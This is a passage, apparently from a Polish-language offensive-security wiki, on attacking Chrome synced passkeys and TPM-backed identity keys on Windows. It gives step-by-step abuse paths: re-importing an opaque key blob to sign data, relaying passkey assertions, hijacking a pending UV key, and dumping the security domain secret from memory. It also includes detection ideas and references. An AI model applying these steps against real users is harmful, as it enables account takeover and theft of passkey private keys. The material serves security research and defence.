Jeśli przeglądarka eksportuje klucz tożsamości obsługiwany przez TPM jako **`NCRYPT_OPAQUE_KEY_BLOB`** i przechowuje ten obiekt blob w stanie dostępnym dla użytkownika, malware **nie musi** wyodrębniać surowego klucza prywatnego. Może po prostu ponownie zaimportować obiekt blob na **tym samym komputerze** i poprosić lokalny TPM o podpisanie danych kontrolowanych przez atakującego:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Oznacza to, że **powiązanie sprzętowe uniemożliwia eksport poza urządzenie, ale nie użycie przez tego samego użytkownika na przejętym punkcie końcowym**.

### Praktyczne ścieżki nadużyć

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Wylicz `WebauthnCredentialSpecifics` z LevelDB Chrome.
   - Rozpocznij logowanie za pomocą passkey i uzyskaj świeże wyzwanie WebAuthn.
   - Użyj skradzionego blobu `wrapped_identity_private_key` na TPM ofiary, aby podpisać powiązanie żądania cloud-authenticator.
   - Przekaż uzyskane assertion do relying party.
   - Jest to szczególnie przydatne, gdy RP akceptuje `userVerification=preferred` lub nie odrzuca assertion z **`UV=0`**.
2. **Przejęcie oczekującego klucza UV**<sup>[[4]](#references)</sup>
   - Wymuś ponowne onboarding, usuwając `passkey_enclave_state` lub wysyłając prawidłową, podpisaną operację `device/forget`.
   - Jeśli onboarding pozostawi urządzenie w stanie **`uv_key_pending`**, zarejestruj kontrolowany przez atakującego publiczny klucz UV.
   - Jeśli dostawca nie weryfikuje atestacji ani pochodzenia z bezpiecznego sprzętu dla nowego klucza UV, późniejsze podpisy kluczem atakującego są traktowane jako **`UV=1`**.
3. **Kradzież master secret / odzyskiwania SDS**<sup>[[4]](#references)</sup>
   - Wymuś odzyskiwanie lub ponowne dołączenie, aby Chrome pobrał zsynchronizowany master secret passkey.
   - Obserwuj odtworzenie lub modyfikację `passkey_enclave_state`, a następnie zrzucaj pamięć Chrome, gdy w postaci jawnej znajduje się w niej **sekret domeny zabezpieczeń (SDS)**.
   - Użyj odzyskanego SDS, aby odszyfrować zaszyfrowane pola we wszystkich rekordach `WebauthnCredentialSpecifics` i odzyskać przenośne klucze prywatne WebAuthn.

### Pomysły dotyczące DFIR / wykrywania

- Monitoruj **usuwanie/odtwarzanie** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Alarmuj o nietypowym dostępie procesów innych niż przeglądarka do Chrome **`Sync Data\LevelDB`**.
- Alarmuj o **zrzutach pamięci Chrome** lub podejrzanym dostępie międzyprocesowym do pamięci.
- Zbadaj powtarzające się monity o **PIN odzyskiwania Google Password Manager** lub nieoczekiwane ponowne onboarding.
- Pamiętaj, że WebAuthn **`signCount`** często nie jest przydatny w przypadku zsynchronizowanych passkey, ponieważ jego wartość może pozostać stała, więc klasyczne wykrywanie klonów jest mało skuteczne.

## References

- [1] [Unit 42 – Śledztwo w sprawie wieloletnich, niewykrytych operacji wymierzonych w sektory o wysokiej wartości](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing z makrem Word VBA przez SMTP → odszyfrowanie danych logowania hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Wewnątrz Ink Dragon: ujawnienie sieci przekaźnikowej i wewnętrznego działania skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: nowa powierzchnia ataku w uwierzytelnianiu bezhasłowym](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / magazyn kluczy CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: ataki na systemy i sieci Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Jak naprawdę działa magazyn danych Active Directory: wnętrze NTDS.dit (część 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Zdalne zrzucanie haseł z Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho rozszerza swój arsenał cyberprzestępczy o toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – funkcja CreateFileW i `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – tryb kopii zapasowej Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – kończenie aktywnych sesji](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
